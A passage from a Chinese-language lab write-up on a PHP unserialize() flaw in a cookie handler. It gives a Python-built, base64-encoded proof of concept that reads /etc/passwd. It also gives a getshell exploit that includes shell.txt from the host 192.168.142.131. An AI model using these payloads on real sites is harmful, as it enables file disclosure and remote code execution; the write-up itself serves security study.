5、进行代码审计

  * index.php
  * <?php
    	include("user.class.php");
    
    	if(!isset($_COOKIE['user'])) {
    		setcookie("user", base64_encode(serialize(new User('sk4'))));
    	} else {
    		unserialize(base64_decode($_COOKIE['user']));
    	}
    	echo "This is a beta test for new cookie handler\n";
    ?>
  * log.class.php
  * <?php
      class Log {
        private $type_log;
    
        function __costruct($hnd) {
          $this->$type_log = $hnd;
        }
    
        public function handler($val) {
          include($this->type_log);
          echo "LOG: " . $val;
        }
      }
    ?>
  * user.class.php
  * <?php
      include("log.class.php");
    
      class Welcome {
        public function handler($val) {
          echo "Hello " . $val;
        }
      }
    
      class User {
        private $name;
        private $wel;
    
        function __construct($name) {
          $this->name = $name;
          $this->wel = new Welcome();
        }
    
        function __destruct() {
          //echo "bye\n";
          $this->wel->handler($this->name);
        }
      }
    
    ?>

代码比较简单，攻击思路就是：在本地构造一个序列化的User对象字符串，使用Log对象替代User对象的Welcome对象，最后将其进行base64编码用来替代浏览器的Cookie。这样当index.php反序列化Cookie的值后User对象已经被改变，当运行完毕调用User的__destruct()时调用的是Log的handler()函数。所以在构造字符串时将Log对象的$type_log设置为我们的目标文件路径即可实现文件包含。

6、构造反序列化漏洞的POC

这里选择在本地编写一个php脚本打印出来

  * <?php
      class Log {
        private $type_log;
    
        function __construct($hnd) {
          $this->$type_log = $hnd;
        }
    
        public function handler($val) {
          include($this->type_log);
          echo "LOG: " . $val;
        }
      }
    
      class User {
        private $name;
        private $wel;
    
        function __construct($name) {
          $this->name = $name;
          $this->wel = new Log('/etc/passwd');
        }
    
        function __destruct() {
          $this->wel->handler($this->name);
        }
      }
    
      $a =  base64_encode(serialize(new User('sk4')));
      echo $a.'<br>';
      echo base64_decode($a).'<br>';
    ?>  

输出结果

  * sk4Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoyOntzOjEzOiIATG9nAHR5cGVfbG9nIjtOO3M6MDoiIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=
    O:4:"User":2:{s:10:"Username";s:3:"sk4";s:9:"Userwel";O:3:"Log":2:{s:13:"Logtype_log";N;s:0:"";s:11:"/etc/passwd";}}

但这样存在一点小问题：Log对象只有$type_log一个变量，构造时应该是将/etc/passwd赋值给它，但上面序列化的结果显示$type_log为N;s:0:""，所以不正确，原因还未找到。这里选择手动删除，然后使用python脚本进行base64编码(使用python是因为在序列化后的结果在存在不可打印字符，详情参考这篇文章https://blog.csdn.net/weixin_45605352/article/details/116428217)

python脚本

  * import base64
    s = 'O:4:"User":2:{s:10:"\x00User\x00name";s:3:"sk4";s:9:"\x00User\x00wel";O:3:"Log":1:{s:13:"\x00Log\x00type_log";s:11:"/etc/passwd";}}'
    print(base64.b64encode(s.encode()))

输出结果

  * Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=

替换Cookie值后请求发现成功包含/etc/passwd

7、构造EXP拿Shell

先假设靶机开了allow_url_include配置，尝试包含远程文件getshell

python脚本生成exp

    s = 'O:4:"User":2:{s:10:"\x00User\x00name";s:3:"sk4";s:9:"\x00User\x00wel";O:3:"Log":1:{s:13:"\x00Log\x00type_log";s:32:"http://192.168.142.131/shell.txt";}}'
    print(base64.b64encode(s.encode()))
  * Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjMyOiJodHRwOi8vMTkyLjE2OC4xNDIuMTMxL3NoZWxsLnR4dCI7fX0=
